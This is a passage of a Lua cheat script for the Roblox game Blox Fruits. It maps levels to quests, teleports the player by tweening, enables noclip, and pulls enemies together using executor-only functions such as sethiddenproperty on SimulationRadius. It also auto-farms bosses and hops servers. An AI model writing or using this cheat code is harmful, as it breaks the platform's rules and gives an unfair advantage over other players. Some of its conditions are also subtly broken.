                elseif MyLevel >= 2075 and MyLevel <= 2099 then
                    Ms = "Peanut Scout"
                    NameQuest = "NutsIslandQuest"
                    LevelQuest = 1
                    NameMon = "Peanut Scout"
                    CFrameQuest = CFrame.new(-2104.17163, 38.1299706, -10194.418, 0.758814394, -1.38604395e-09, 0.651306927, 2.85280208e-08, 1, -3.1108879e-08, -0.651306927, 4.21863646e-08, 0.758814394)
                    CFrameMon = CFrame.new(-2098.07544, 192.611862, -10248.8867, 0.983392298, -9.57031787e-08, 0.181492642, 8.7276355e-08, 1, 5.44169616e-08, -0.181492642, -3.76732068e-08, 0.983392298)
                elseif MyLevel >= 2100 and MyLevel <= 2124 then
                    Ms = "Peanut President"
                    NameQuest = "NutsIslandQuest"
                    LevelQuest = 2
                    NameMon = "Peanut President"
                    CFrameQuest = CFrame.new(-2104.17163, 38.1299706, -10194.418, 0.758814394, -1.38604395e-09, 0.651306927, 2.85280208e-08, 1, -3.1108879e-08, -0.651306927, 4.21863646e-08, 0.758814394)
                    CFrameMon = CFrame.new(-1876.95959, 192.610947, -10542.2939, 0.0553516336, -2.83836812e-08, 0.998466909, -6.89634405e-10, 1, 2.84654931e-08, -0.998466909, -2.26418861e-09, 0.0553516336)
                elseif MyLevel >= 2125 and MyLevel <= 2149 then
                    Ms = "Ice Cream Chef"
                    NameQuest = "IceCreamIslandQuest"
                    LevelQuest = 1
                    NameMon = "Ice Cream Chef"
                    CFrameQuest = CFrame.new(-820.404358, 65.8453293, -10965.5654, 0.822534859, 5.24448502e-08, -0.568714678, -2.08336317e-08, 1, 6.20846663e-08, 0.568714678, -3.92184099e-08, 0.822534859)
                    CFrameMon = CFrame.new(-821.614075, 208.39537, -10990.7617, -0.870096624, 3.18909272e-08, 0.492881238, -1.8357893e-08, 1, -9.71107568e-08, -0.492881238, -9.35439957e-08, -0.870096624)
                elseif MyLevel >= 2150 and MyLevel <= 2199 then 
                    Ms = "Ice Cream Commander"
                    NameQuest = "IceCreamIslandQuest"
                    LevelQuest = 2
                    NameMon = "Ice Cream Commander"
                    CFrameQuest = CFrame.new(-819.376526, 67.4634171, -10967.2832)
                    CFrameMon = CFrame.new(-610.11669921875, 208.26904296875, -11253.686523438)
                elseif MyLevel >= 2200 and MyLevel <= 2224 then 
                    Ms = "Cookie Crafter"
                    NameQuest = "CakeQuest1"
                    LevelQuest = 1
                    NameMon = "Cookie Crafter"
                    CFrameQuest = CFrame.new(-2020.6068115234375, 37.82400894165039, -12027.80859375)
                    CFrameMon = CFrame.new(-2286.684326171875, 146.5656280517578, -12226.8818359375)
                elseif MyLevel >= 2225 and MyLevel <= 2249 then 
                    Ms = "Cake Guard"
                    NameQuest = "CakeQuest1"
                    LevelQuest = 2
                    NameMon = "Cake Guard"
                    CFrameQuest = CFrame.new(-2020.6068115234375, 37.82400894165039, -12027.80859375)
                    CFrameMon = CFrame.new(-1817.9747314453125, 209.5632781982422, -12288.9228515625)
                elseif MyLevel >= 2250 and MyLevel <= 2274 then 
                    Ms = "Baking Staff"
                    NameQuest = "CakeQuest2"
                    LevelQuest = 1
                    NameMon = "Baking Staff"
                    CFrameQuest = CFrame.new(-1928.31763, 37.7296638, -12840.626)
                    CFrameMon = CFrame.new(-1818.347900390625, 93.41275787353516, -12887.66015625)
                elseif MyLevel == 2275 or MyLevel <= 2299 then
                    Ms = "Head Baker"
                    CFrameMon = CFrame.new(-2068.284912109375, 68.5050048828125, -12950.775390625)
                    LevelQuest = 2
                    NameQuest = "CakeQuest2"
                    NameMon = "Head Baker"
                    CFrameQuest = CFrame.new(-1927.91602, 37.7981339, -12842.5391, -0.96804446, 4.22142143e-08, 0.250778586, 4.74911062e-08, 1, 1.49904711e-08, -0.250778586, 2.64211941e-08, -0.96804446)
                elseif MyLevel == 2300 or MyLevel <= 2324 then
                    Ms = "Cocoa Warrior"
                    CFrameMon = CFrame.new(43.3896598815918, 56.341636657714844, -12324.78515625)
                    LevelQuest = 1
                    NameQuest = "ChocQuest1"
                    NameMon = "Cocoa Warrior"
                    CFrameQuest = CFrame.new(231.88818359375, 24.769283294677734, -12202.1337890625)
                elseif MyLevel == 2325 or MyLevel <= 2349 then
                    Ms = "Chocolate Bar Battler"
                    CFrameMon = CFrame.new(719.6046752929688, 69.9678955078125, -12597.25390625)
                    LevelQuest = 2
                    NameQuest = "ChocQuest1"
                    NameMon = "Chocolate Bar Battler"
                    CFrameQuest = CFrame.new(231.88818359375, 24.769283294677734, -12202.1337890625)
                elseif MyLevel <= 2374 then
                    Ms = "Sweet Thief"
                    CFrameMon = CFrame.new(155.99618530273438, 54.82904815673828, -12580.7265625)
                    LevelQuest = 1
                    NameQuest = "ChocQuest2"
                    NameMon = "Sweet Thief"
                    CFrameQuest = CFrame.new(151.1981201171875, 24.828855514526367, -12778.08984375)
                elseif MyLevel <= 2449 then
                    Ms = "Candy Rebel"
                    CFrameMon = CFrame.new(-7.535787105560303, 35.526527404785156, -12896.34375)
                    LevelQuest = 2
                    NameQuest = "ChocQuest2"
                    NameMon = "Candy Rebel"
                    CFrameQuest = CFrame.new(151.1981201171875, 24.828855514526367, -12778.08984375)
                elseif MyLevel <= 2474 then
                    Ms = "Isle Outlaw"
                    CFrameMon = CFrame.new(-16241.5107, 121.569138, -185.911652)
                    LevelQuest = 1
                    NameQuest = "TikiQuest1"
                    NameMon = "Isle Outlaw"
                    CFrameQuest = CFrame.new(-16548.81640625, 55.60599136352539, -172.8125)
                elseif MyLevel <= 2499 then
                    Ms = "Island Boy"
                    CFrameMon = CFrame.new(-16946.541, 115.841362, -140.827713)
                    LevelQuest = 2
                    NameQuest = "TikiQuest1"
                    NameMon = "Island Boy"
                    CFrameQuest = CFrame.new(-16548.81640625, 55.60599136352539, -172.8125)
                elseif MyLevel <= 2524 then
                    Ms = "Sun-kissed Warrior"
                    CFrameMon = CFrame.new(-16191.3447, 21.656559, 968.527344)
                    LevelQuest = 1
                    NameQuest = "TikiQuest2"
                    NameMon = "kissed"
                    CFrameQuest = CFrame.new(-16539.3359, 55.6565514, 1050.70544)
                elseif MyLevel >= 2525 then
                    Ms = "Isle Champion"
                    CFrameMon = CFrame.new(-16813.209, 21.656559, 1058.44409)
                    LevelQuest = 2
                    NameQuest = "TikiQuest2"
                    NameMon = "Isle Champion"
                    CFrameQuest = CFrame.new(-16539.3359, 55.6565514, 1050.70544)
                end
            end

            return {
                QuestLevel = LevelQuest,
                QuestGiverPosition = CFrameQuest,
                NPCName = Ms,
                QuestNPCName = NameMon,
                QuestName = NameQuest,
                MyLevel = MyLevel,
                NPCPosition = CFrameMon
            }
        end

        function getDistance(CFrame)
            return (CFrame.Position - LP.Character.HumanoidRootPart.Position).Magnitude
        end
        local function toPoint(cframe)
            Distance = (cframe.Position - LP.Character.HumanoidRootPart.Position).Magnitude
            if Distance > 4000 then
                cframe = CFrame.new(cframe.x, cframe.y + 100, cframe.z)
            end
            if Distance < 25 then
                LP.Character.HumanoidRootPart.CFrame = cframe
            elseif Distance < 50 then
                LP.Character.HumanoidRootPart.CFrame = cframe
            end
            Speed = _G.TweenSpeed
            game:GetService("TweenService"):Create(
                LP.Character.HumanoidRootPart,
                TweenInfo.new(Distance/Speed, Enum.EasingStyle.Linear),
                {CFrame = cframe}
            ):Play()
        end

        local function followTarget(cframe)
            if type(cframe) == "vector" then
                cframe = CFrame.new(cframe.X,cframe.Y,cframe.Z)
            end
            Distance = (cframe.Position - LP.Character.HumanoidRootPart.Position).Magnitude
            if Distance > 4000 then
                cframe = CFrame.new(cframe.X, cframe.Y + 100, cframe.Z)
            end
            if Distance == nil then return end
            cframe = CFrame.new(cframe.X,cframe.Y,cframe.Z)
            if Distance >= 1000 then
                Speed = 220
            end
            if Distance < 1000 and Distance >= 750 then
                Speed = 230
            end
            if Distance < 25 then
                Speed = 600
            elseif Distance < 50 then
                Speed = 600
            elseif Distance < 150 then
                Speed = 500
            elseif Distance < 250 then
                Speed = 400
            elseif Distance < 500 then
                Speed = 300
            elseif Distance < 750 then
                Speed = 250
            end
            game:GetService("TweenService"):Create(
                LP.Character.HumanoidRootPart,
                TweenInfo.new(Distance/Speed, Enum.EasingStyle.Linear),
                {CFrame = cframe}
            ):Play()
        end

        local function toTarget(cframe)
            if type(cframe) == "vector" then
                cframe = CFrame.new(cframe.X,cframe.Y,cframe.Z)
            end
            Distance = (cframe.Position - LP.Character.HumanoidRootPart.Position).Magnitude
            if Distance > 4000 then
                cframe = CFrame.new(cframe.X, cframe.Y + 100, cframe.Z)
            end
            if Distance == nil then return end
            cframe = CFrame.new(cframe.X,cframe.Y,cframe.Z)
            if Distance < 25 then
                LP.Character.HumanoidRootPart.CFrame = cframe
            end
            Speed = _G.TweenSpeed
            game:GetService("TweenService"):Create(
                LP.Character.HumanoidRootPart,
                TweenInfo.new(Distance/Speed, Enum.EasingStyle.Linear),
                {CFrame = cframe}
            ):Play()
        end

        local function GetIsLand(...)
            local RealtargetPos = {...}
            local targetPos = RealtargetPos[1]
            local RealTarget
            if type(targetPos) == "vector" then
                RealTarget = targetPos
            elseif type(targetPos) == "userdata" then
                RealTarget = targetPos.Position
            elseif type(targetPos) == "number" then
                RealTarget = CFrame.new(unpack(RealtargetPos))
                RealTarget = RealTarget.p
            end
        
            local ReturnValue
            local CheckInOut = math.huge;
            if LP.Team then
                for i,v in pairs(game.Workspace._WorldOrigin.PlayerSpawns:FindFirstChild(tostring(LP.Team)):GetChildren()) do 
                    local ReMagnitude = (RealTarget - v:GetModelCFrame().p).Magnitude;
                    if ReMagnitude < CheckInOut then
                        CheckInOut = ReMagnitude;
                        ReturnValue = v.Name
                    end
                end
                if ReturnValue then
                    return ReturnValue
                end 
            end
        end

        function getMyBoat()
            for i,v in pairs(workspace.Boats:GetChildren()) do
                if v:FindFirstChild("Owner") then
                    if v.Owner.Value == LP then
                        return v
                    end
                end
            end
            return false
        end

        function getPlayerBoat(plName)
            for i,v in pairs(workspace.Boats:GetChildren()) do
                if v:FindFirstChild("Owner") then
                    if v.Owner.Value == game.Players[plName] then
                        return v
                    end
                end
            end
            return false
        end
        
        function buyBoat()
            if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GetUnlockables").BeastHunter then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBoat", "Beast Hunter")
            else
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBoat", "Guardian")
            end
        end

        function getDistanceBoat(CFrame)
            if getMyBoat() then
                return (CFrame.Position - getMyBoat().VehicleSeat.Position).Magnitude
            else
                return math.huge
            end
        end

        function toPlayerBoat(plName)
            local boat = getPlayerBoat(plName)
            if boat then
                toPoint(boat.VehicleSeat.CFrame * CFrame.new(0,30,0))
            end
        end

        function toBoat()
            local myBoat = getMyBoat()
            if myBoat then
                toPoint(myBoat.VehicleSeat.CFrame)
            end
        end

        function isOnBoat()
            local myBoat = getMyBoat()
            if myBoat then
                if myBoat.VehicleSeat:FindFirstChild("SeatWeld") and LP.Character.Humanoid.Sit == true then
                    return true
                else
                    return false
                end
            else 
                return false
            end
        end

        function dismountBoat()
            local myBoat = getMyBoat()
            if myBoat then
                if myBoat.VehicleSeat:FindFirstChild("SeatWeld") then
                    LP.Character.Humanoid.Sit = false
                else
                    return true
                end
            else 
                return true
            end
        end

        function toBoatSeaBeast()
            local myBoat = getMyBoat()
            if not myBoat then
                local dealerPos = CFrame.new(92.9887619, 11.373209, 2954.28418, 0.593479872, 1.64508862e-09, -0.80484885, 5.52274804e-09, 1, 6.11633899e-09, 0.80484885, -8.07490164e-09, 0.593479872)
                if getDistance(dealerPos) > 20 then
                    if useNearestEntrance(dealerPos) then
                        StopTween()
                    end
                    toPoint(dealerPos)
                    wait()
                    toBoat()
                else
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBoat", "Guardian")
                    wait()
                    toBoat()
                end
            else
                repeat wait()
                    toPoint(myBoat.VehicleSeat.CFrame)
                until myBoat.VehicleSeat:FindFirstChild("SeatWeld")
            end
        end

        function bringBoat(cframe)
            if getMyBoat() then
                getMyBoat().VehicleSeat.CFrame = cframe
            end
        end

        function stopBoat()
            cframe = getMyBoat().VehicleSeat.CFrame
            game:GetService("TweenService"):Create(
                getMyBoat().VehicleSeat,
                TweenInfo.new(Distance/Speed, Enum.EasingStyle.Linear),
                {CFrame = cframe}
            ):Play()
        end

        function tweenBoat(cframe)
            Distance = (cframe.Position - LP.Character.HumanoidRootPart.Position).Magnitude
            Speed = 300
            game:GetService("TweenService"):Create(
                getMyBoat().VehicleSeat,
                TweenInfo.new(Distance/Speed, Enum.EasingStyle.Linear),
                {CFrame = cframe}
            ):Play()
        end        
        

        function InMyNetWork(object)
            if isnetworkowner then
                return isnetworkowner(object)
            else
                if (object.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 750 then 
                    return true
                end
                return false
            end
        end
        spawn(function()
            while true do wait()
                if setscriptable then
                    setscriptable(LP, "SimulationRadius", true)
                end
                if sethiddenproperty then
                    sethiddenproperty(LP, "SimulationRadius", math.huge)
                end
            end
        end)

        function EquipWeapon(Tool)
            if Tool == 'Fruit' then Tool = "Blox Fruit" end
            pcall(function()
                if LP.Character:FindFirstChildOfClass("Tool") and LP.Character:FindFirstChildOfClass("Tool").ToolTip == Tool then return end
                for i,v in pairs(LP.Backpack:GetChildren()) do
                    if v.ToolTip == Tool then 
                        LP.Character.Humanoid:EquipTool(v) 
                        return
                    end
                end
            end)
        end
        function UnEquipWeapon(Weapon)
            if LP.Character:FindFirstChild(Weapon) then
                LP.Character:FindFirstChild(Weapon).Parent = LP.Backpack
            end
        end
        function Bypass(Point)
            toTarget(LP.Character.HumanoidRootPart.CFrame)
            wait(1.5)
            _G.StopTween = true
            _G.StertScript = false
            if not LP.Character:FindFirstChild("Head") then return end
            LP.Character.Head:Destroy()
            LP.Character.HumanoidRootPart.CFrame = Point * OffsetCFrame()
            wait(.2)
            LP.Character.HumanoidRootPart.CFrame = Point
            ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
            wait(.1)
            LP.Character.HumanoidRootPart.CFrame = Point * OffsetCFrame()
            LP.Character.HumanoidRootPart.Anchored = true
            wait(.1)
            LP.Character.HumanoidRootPart.CFrame = Point
            wait(0.5)
            LP.Character.HumanoidRootPart.Anchored = false
        
            _G.StopTween = false
            _G.StertScript = false
            _G.Clip = false
            if LP.Character.HumanoidRootPart:FindFirstChild("BodyClip") then
                LP.Character.HumanoidRootPart:FindFirstChild("BodyClip"):Destroy()
            end
            _G.Clip = false
        end
        
        spawn(function()
            while wait() do
                if _G.AutoFarmPlayer then
                    local args = {
                        [1] = "EnablePvp"
                    }
                    ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                end
                wait(2)
            end
        end)

        spawn(function()
            while task.wait() do 
                if NoClip or _G.AutoFarmLevel then
                    if LP.Character:WaitForChild("Humanoid").Sit == true then
                        if not AutoSeaBeast and not AutoSeaBeastRaceV3 then
                            LP.Character:WaitForChild("Humanoid").Sit = false
                        end
                    end

                    if LP.Character:FindFirstChild("HumanoidRootPart") then
                        if not LP.Character.HumanoidRootPart:FindFirstChild("BodyVelocity1") then
                            if LP.Character:WaitForChild("Humanoid").Sit == true then
                                if not AutoSeaBeast and not AutoSeaBeastRaceV3 then
                                    LP.Character:WaitForChild("Humanoid").Sit = false
                                end
                            end
                            local BodyVelocity = Instance.new("BodyVelocity")
                            BodyVelocity.Name = "BodyVelocity1"
                            BodyVelocity.Parent =  LP.Character.HumanoidRootPart
                            BodyVelocity.MaxForce = Vector3.new(10000, 10000, 10000)
                            BodyVelocity.Velocity = Vector3.new(0, 0, 0)
                        end
                    end
                    for _, v in pairs(LP.Character:GetDescendants()) do
                        if v:IsA("BasePart") then
                            v.CanCollide = false    
                        end
                    end
                else
                    if LP.Character.HumanoidRootPart:FindFirstChild("BodyVelocity1") then
                        LP.Character.HumanoidRootPart:FindFirstChild("BodyVelocity1"):Destroy()
                    end
                end
            end
        end)
        spawn(function()
            pcall(function()
                game:GetService("RunService").Stepped:Connect(function()
                    if NoClip or _G.AutoFarmLevel then
                        if not LP.Character.Head:FindFirstChild("BodyVelocity") then
                            local ag = Instance.new("BodyVelocity")
                            ag.Velocity = Vector3.new(0, 0, 0)
                            ag.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                            ag.P = 9000
                            ag.Parent = LP.Character.Head
                            for r, v in pairs(LP.Character:GetDescendants()) do
                                if v:IsA("BasePart") then
                                    v.CanCollide = false
                                end
                            end
                        end
                        for _, v in pairs(LP.Character:GetDescendants()) do
                            if v:IsA("BasePart") then
                                v.CanCollide = false    
                            end
                        end
                    elseif not NoClip and LP.Character.Head:FindFirstChild("BodyVelocity") then
                        LP.Character.Head:FindFirstChild("BodyVelocity"):Destroy()
                    end
                end)
            end)
        end)


 
        -- kaitun mode
        _G.PosMon = nil
        spawn(function()
            while task.wait() do
                st, err = pcall(function()
                    if BringMobFarm then
                        if first_sea then 
                            range = 300 
                        end
                        if second_sea then
                            if GetIsLand(LP.Character.HumanoidRootPart.CFrame) == "Ship" then
                                range = 150
                            else
                                if getgenv().EuphoriaSettings["Auto Rengoku"] then
                                    range = 200
                                else
                                    range = 300
                                end
                            end 
                        end
                        if third_sea then
                            if FarmBones or FarmBonesCDK or FarmBonesGH then
                                range = 200
                            else
                                range = 300
                            end
                        end
                        for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                            pcall(function()
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and not string.find(v.Humanoid.DisplayName, "Boss") and v:FindFirstChild("HumanoidRootPart") and getDistance(v.HumanoidRootPart.CFrame) <= range then
                                    if getDistance(PosMon) < 1000 then
                                        v.HumanoidRootPart.CFrame = PosMon
                                        v.HumanoidRootPart.Size = Vector3.new(20,20,20)                                               
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Head.CanCollide = false
                                        v.Humanoid.JumpPower = 0
                                        v.Humanoid.WalkSpeed = 0
                                        if v.Humanoid:FindFirstChild("Animator") then
                                            v.Humanoid.Animator:Destroy()
                                        end
                                        v.Humanoid:ChangeState(14)
                                        sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
                                    end
                                end
                            end)
                        end
                    end
                end)
            end
        end)
        spawn(function()
            while task.wait() do
                st, err = pcall(function()
                    if BringMobFarmMastery then
                        range = 400
                        for i,vM in pairs(game.Workspace.Enemies:GetChildren()) do
                            pcall(function()
                                if PosMonMastery and FarmMasteryTarget and vM.Name == FarmMasteryTarget.Name and vM:FindFirstChild("Humanoid") and vM:FindFirstChild("HumanoidRootPart") and not string.find(vM.Humanoid.DisplayName, "Boss") and vM:FindFirstChild("HumanoidRootPart") and (vM.HumanoidRootPart.CFrame.Position - PosMonMastery.Position).Magnitude <= range then
                                    vM.HumanoidRootPart.CFrame = PosMonMastery
                                    vM.HumanoidRootPart.Size = Vector3.new(20,20,20)                                               
                                    vM.HumanoidRootPart.CanCollide = false
                                    vM.Head.CanCollide = false
                                    vM.Humanoid.JumpPower = 0
                                    vM.Humanoid.WalkSpeed = 0
                                    if vM.Humanoid:FindFirstChild("Animator") then
                                        vM.Humanoid.Animator:Destroy()
                                    end
                                    vM.Humanoid:ChangeState(14)
                                    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
                                end
                            end)
                        end
                    end
                end)
            end
        end)

        

        local function farmSkyGuards()
            pos = CFrame.new(-4716.95703, 853.089722, -1933.925427)
            if getDistance(pos) > 3000 then
                useNearestEntrance(pos)
                wait(.1)
                toPoint(pos)
            else
                toPoint(pos)
            end
            local mobsKilled = 0
            repeat wait()
                local MyLevel = LP.Data.Level.Value
                local QuestC = LP.PlayerGui.Main.Quest
                if MyLevel > 20 then
                    if LP.PlayerGui.Main.PvpDisabled.Visible == true then
                        if string.find(ReplicatedStorage.Remotes.CommF_:InvokeServer("PlayerHunter"), "We heard") then
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("EnablePvp")
                        end
                    else
                        ReplicatedStorage.Remotes.CommF_:InvokeServer("PlayerHunter")
                    end
                end
                if game:GetService("Workspace").Enemies:FindFirstChild("God's Guard") then
                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name == "God's Guard" then
                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                repeat task.wait()
                                    PosMon = v.HumanoidRootPart.CFrame
                                    v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                    v.HumanoidRootPart.CanCollide = false
                                    v.Humanoid.WalkSpeed = 0
                                    v.Head.CanCollide = false
                                    BringMobFarm = true
                                    PosMon = v.HumanoidRootPart.CFrame
                                    EquipWeapon(_G.SelectWeapon)
                                    v.HumanoidRootPart.Transparency = 0.9
                                    toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                until not v.Parent or v.Humanoid.Health <= 0 or not v:FindFirstChild("HumanoidRootPart")
                                mobsKilled = 1
                            end
                        end
                    end
                else
                    toPoint(pos * OffsetCFrame())
                end
            until QuestC.Visible == true or mobsKilled == 1
        end
        
        local function isPlayerHunterQuest(Quest) 
            for i,v in pairs(Players:GetChildren()) do
                if string.find(Quest.Container.QuestTitle.Title.Text, v.Name) then
                    return true
                end
            end
            return false
        end
        
        local function teleportToSecondSea()
            ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelDressrosa")
        end

        local function teleportToThirdSea()
            ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
        end

        local function doSecondSea()
            if game.Workspace.Map.Ice.Door.Transparency == 0 then
                local args = {
                    [1] = "DressrosaQuestProgress",
                    [2] = "Detective"
                }
                ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                wait(2)
                if LP.Backpack:FindFirstChild("Key") then
                    local tool = LP.Backpack:FindFirstChild("Key")
                    wait(.4)
                    LP.Character.Humanoid:EquipTool(tool)
                    repeat wait()
                        toTarget(game.Workspace.Map.Ice.Door.CFrame)
                        wait(1)
                    until getDistance(game.Workspace.Map.Ice.Door.CFrame) < 10
                    wait(1)
                    if getDistance(game.Workspace.Map.Ice.Door.CFrame) < 5 then
                        repeat wait()
                            local tool = LP.Backpack:FindFirstChild("Key")
                            wait(.4)
                            LP.Character.Humanoid:EquipTool(tool)
                            game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
                            wait(1)
                        until game.Workspace.Map.Ice.Door.Transparency == 1 or not LP.Backpack:FindFirstChild("Key")
                    end
                    local entity = 0
                    for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                        if v.Humanoid.DisplayName == "Ice Admiral [Lv. 700] [Boss]" then
                            entity = 1
                            repeat task.wait()
                                PosMon = v.HumanoidRootPart.CFrame
                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                v.HumanoidRootPart.CanCollide = false
                                v.Humanoid.WalkSpeed = 0
                                v.Head.CanCollide = false
                                BringMobFarm = true
                                PosMon = v.HumanoidRootPart.CFrame
                                EquipWeapon(_G.SelectWeapon)
                                v.HumanoidRootPart.Transparency = 0.9
                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            until not v.Parent or v.Humanoid.Health <= 0 or not v:FindFirstChild("HumanoidRootPart")
                        end
                    end
                    if not entity then HopServer() end
                    wait(.5)
                    teleportToSecondSea()
                end
            else
                local entity = 0
                for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                    if v.Humanoid.DisplayName == "Ice Admiral [Lv. 700] [Boss]" then
                        entity = 1
                        repeat task.wait()
                            PosMon = v.HumanoidRootPart.CFrame
                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                            v.HumanoidRootPart.CanCollide = false
                            v.Humanoid.WalkSpeed = 0
                            v.Head.CanCollide = false
                            BringMobFarm = true
                            PosMon = v.HumanoidRootPart.CFrame
                            EquipWeapon(_G.SelectWeapon)
                            v.HumanoidRootPart.Transparency = 0.9
                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                        until not v.Parent or v.Humanoid.Health <= 0 or not v:FindFirstChild("HumanoidRootPart")
                    end
                end
                if not entity then HopServer() end
                
                
                wait(.5)
                teleportToSecondSea()
            end
        end


        wait(0.5)
        game:GetService("GuiService").ErrorMessageChanged:Connect(function(err)
            if _G.AutoFarmLevel or _G.AutoRejoinServer or getgenv().EuphoriaSettings['Auto Rejoin'] then 
                if err and not string.find(err, "eleport") and string.len(err) > 10 then
                    if #game.Players:GetChildren() < 3 then
                        HopServer()
                    else
                        TeleportService:Teleport(game.PlaceId, LP)
                    end
                end
            end
        end)

        

        _G.KillingPlayer = false
        function getClosest(NPCs)
            dist = math.huge
            local t = false
            for i,v in pairs(NPCs) do
                for n,b in pairs(game.Workspace.Enemies:GetChildren()) do
                    if b:FindFirstChild("Humanoid") and b:FindFirstChild("HumanoidRootPart") then
                        if string.find(b.Name, v) and getDistance(b.HumanoidRootPart.CFrame) < dist and b.Humanoid.Health > 0 then
                            t = b
                            dist = getDistance(b.HumanoidRootPart.CFrame)
                        end
                    end
                end
                for n,b in pairs(game.ReplicatedStorage:GetChildren()) do
                    if b:FindFirstChild("Humanoid") and b:FindFirstChild("HumanoidRootPart") then
                        if string.find(b.Name, v) and getDistance(b.HumanoidRootPart.CFrame) < dist and b.Humanoid.Health > 0 then
                            t = b
                            dist = getDistance(b.HumanoidRootPart.CFrame)
                        end
                    end
                end
            end
            return t
        end
        function getNearestNPCSpawnPoint(NPCName)
            local dist = math.huge
            local point = {}
            for i,v in pairs(workspace._WorldOrigin.EnemySpawns:GetChildren()) do
                if string.find(v.Name, NPCName) then
                    if getDistance(v.CFrame) < dist then
                        dist = getDistance(v.CFrame)
                        table.insert(point, v)
                    end
                end
            end
            return point[#point]
        end
        function getSpawnPoints(NPCs)
            spawnPoints = {}
            for q,npcname in pairs(NPCs) do
                for i,v in pairs(workspace._WorldOrigin.EnemySpawns:GetChildren()) do
                    if string.find(v.Name, npcname) then
                        table.insert(spawnPoints, v.CFrame)
                    end
                end
            end
            return spawnPoints
        end

        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings["Auto Rengoku"] and not isWeaponInInventory("Rengoku") then
                        if not LP.Backpack:FindFirstChild("Hidden Key") then
                            if getgenv().EuphoriaSettings["Auto Rengoku Hop"] then
                                if game.Workspace.Enemies:FindFirstChild("Awakened Ice Admiral") and game.Workspace.Enemies:FindFirstChild("Awakened Ice Admiral"):FindFirstChild("HumanoidRootPart") and game.Workspace.Enemies:FindFirstChild("Awakened Ice Admiral").Humanoid.Health > 0 then
                                    v = game.Workspace.Enemies:FindFirstChild("Awakened Ice Admiral")
                                    if v:FindFirstChild("HumanoidRootPart") then
                                        if v.Humanoid.Health > 0 then 
                                            repeat task.wait()
                                                EquipWeapon(_G.SelectWeapon)
                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                v.Humanoid.WalkSpeed = 0
                                                v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                                v.Humanoid:ChangeState(14)
                                                v.HumanoidRootPart.CanCollide = false
                                                v.Head.CanCollide = false
                                                BringMobFarm = false
                                                RenMon = v.Name
                                                RenPos = v.HumanoidRootPart.CFrame
                                                PosMon = v.HumanoidRootPart.CFrame
                                            until not getgenv().EuphoriaSettings["Auto Rengoku"] or not v.Parent or v.Humanoid.Health <= 0
                                        end
                                    else
                                        toTarget(LP.Character.HumanoidRootPart.CFrame)
                                    end
                                elseif ReplicatedStorage:FindFirstChild("Awakened Ice Admiral") and ReplicatedStorage:FindFirstChild("Awakened Ice Admiral"):FindFirstChild("HumanoidRootPart") and ReplicatedStorage:FindFirstChild("Awakened Ice Admiral").Humanoid.Health > 0  then
                                    v = ReplicatedStorage:FindFirstChild("Awakened Ice Admiral")
                                    if v:FindFirstChild("HumanoidRootPart") then
                                        if v.Humanoid.Health > 0 then 
                                            repeat task.wait()
                                                EquipWeapon(_G.SelectWeapon)
                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                v.Humanoid.WalkSpeed = 0
                                                v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                                v.Humanoid:ChangeState(14)
                                                v.HumanoidRootPart.CanCollide = false
                                                v.Head.CanCollide = false
                                                BringMobFarm = false
                                                RenMon = v.Name
                                                RenPos = v.HumanoidRootPart.CFrame
                                                PosMon = v.HumanoidRootPart.CFrame
                                            until not getgenv().EuphoriaSettings["Auto Rengoku"] or not v.Parent or v.Humanoid.Health <= 0
                                        end
                                    else
                                        toTarget(LP.Character.HumanoidRootPart.CFrame)
                                    end
                                else
                                    HopServer()
                                end
                            else
                                if game.Workspace.Enemies:FindFirstChild("Awakened Ice Admiral") then
                                    v = game.Workspace.Enemies:FindFirstChild("Awakened Ice Admiral")
                                    if v:FindFirstChild("HumanoidRootPart") then
                                        if v.Humanoid.Health > 0 then 
                                            repeat task.wait()
                                                EquipWeapon(_G.SelectWeapon)
                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                v.Humanoid.WalkSpeed = 0
                                                v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                                v.Humanoid:ChangeState(14)
                                                v.HumanoidRootPart.CanCollide = false
                                                v.Head.CanCollide = false
                                                BringMobFarm = false
                                                RenMon = v.Name
                                                RenPos = v.HumanoidRootPart.CFrame
                                                PosMon = v.HumanoidRootPart.CFrame
                                            until not getgenv().EuphoriaSettings["Auto Rengoku"] or not v.Parent or v.Humanoid.Health <= 0
                                        end
                                    else
                                        toTarget(LP.Character.HumanoidRootPart.CFrame)
                                    end
